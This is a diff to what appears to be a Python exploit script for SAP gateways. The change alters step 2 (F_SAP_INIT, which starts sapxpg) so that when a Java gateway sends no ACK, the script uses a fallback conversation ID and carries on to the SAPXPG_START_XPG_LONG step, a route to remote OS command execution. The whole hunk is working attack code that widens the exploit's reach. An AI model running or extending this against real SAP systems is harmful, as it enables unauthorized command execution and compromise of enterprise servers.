@@ -1036,37 +1036,43 @@ def main():
     print("[+] Accepted by gateway (%d frame(s))" % len(p1_frames))
 
     # Step 2: F_SAP_INIT
-    # Wait up to args.timeout for the first frame (gateway may be slow to start
-    # sapxpg), then collect any additional frames with a short 1s window.
+    # ABAP gateways ACK this with the conv_id we use in P3.
+    # SAP Java gateways may NOT send an ACK at all — they silently register
+    # the session and wait for P3 (F_SAP_SEND) directly.
+    # Strategy: try to read the ACK with a short 3s window; if nothing arrives,
+    # proceed with a fallback conv_id and attempt P3 anyway.
     print("\n[*] Step 2: F_SAP_INIT (STARTED_PRG -> sapxpg)")
     ni_send(sock, p2_data)
-    try:
-        first_p2 = ni_recv(sock, args.timeout)
-    except socket.timeout:
-        print("[-] Timeout waiting for F_SAP_INIT response")
-        sock.close()
-        sys.exit(1)
-    p2_frames = [first_p2] + ni_drain(sock, 1)
-    if args.verbose:
-        for i, f in enumerate(p2_frames):
-            print("[*] P2 frame %d (%d bytes):" % (i + 1, len(f)))
-            print(hexdump(f[:200]))
-
     conv_id = None
-    for f in p2_frames:
-        info = parse_response(f, "F_SAP_INIT")
-        if info["error"]:
-            print("[-] F_SAP_INIT error: %s" % info["error_msg"])
-            sock.close()
-            sys.exit(1)
-        if info["conv_id"] and not conv_id:
-            conv_id = info["conv_id"]
+    try:
+        first_p2 = ni_recv(sock, min(args.timeout, 3))
+        p2_frames = [first_p2] + ni_drain(sock, 1)
+        if args.verbose:
+            for i, f in enumerate(p2_frames):
+                print("[*] P2 frame %d (%d bytes):" % (i + 1, len(f)))
+                print(hexdump(f[:200]))
+        for f in p2_frames:
+            info = parse_response(f, "F_SAP_INIT")
+            if info["error"]:
+                print("[-] F_SAP_INIT error: %s" % info["error_msg"])
+                sock.close()
+                sys.exit(1)
+            if info["conv_id"] and not conv_id:
+                conv_id = info["conv_id"]
+        if conv_id:
+            print("[+] Conversation ID: %s (from %d frame(s))" % (conv_id, len(p2_frames)))
+        else:
+            print("[*] No conv_id in F_SAP_INIT response — using fallback")
+    except socket.timeout:
+        # Java gateway did not ACK — proceed with fallback conv_id
+        print("[*] No F_SAP_INIT ACK (Java gateway?) — proceeding with fallback conv_id")
 
     if not conv_id:
-        print("[-] Could not extract conversation ID from F_SAP_INIT response")
-        sock.close()
-        sys.exit(1)
-    print("[+] Conversation ID: %s (from %d frame(s))" % (conv_id, len(p2_frames)))
+        # Fallback: use "00000001" which is a valid-looking conv_id.
+        # Some Java gateways track the session internally and don't care what
+        # conv_id the client uses in subsequent packets.
+        conv_id = "00000001"
+        print("[*] Using fallback conv_id: %s" % conv_id)
 
     # Step 3: F_SAP_SEND (SAPXPG_START_XPG_LONG)
     # SAP Java gateways send multiple NI frames in response to this step:
